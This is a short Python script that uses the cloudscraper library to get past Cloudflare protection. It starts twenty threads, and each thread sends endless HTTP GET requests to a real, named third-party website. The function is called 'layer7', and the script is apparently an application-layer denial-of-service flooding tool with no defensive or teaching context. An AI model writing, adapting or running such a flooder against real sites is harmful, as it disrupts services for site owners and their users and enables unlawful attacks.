import socket
import threading
import os
import cloudscraper
scraper = cloudscraper.create_scraper()
numberthread = 20
def layer7():
    url = "https://patorjk.com/"
    while True:
        send = scraper.get(url)
        sendseconds = 500
        for i in range(sendseconds):
            a = scraper.get(url)
threads = []
for _ in range(numberthread):
    thread = threading.Thread(target=layer7)
    thread.deamon = False
    thread.start()
    threads.append(thread)
try:
    for thread in threads:
        thread.join()
except KeyboardInterrupt:
    print("End")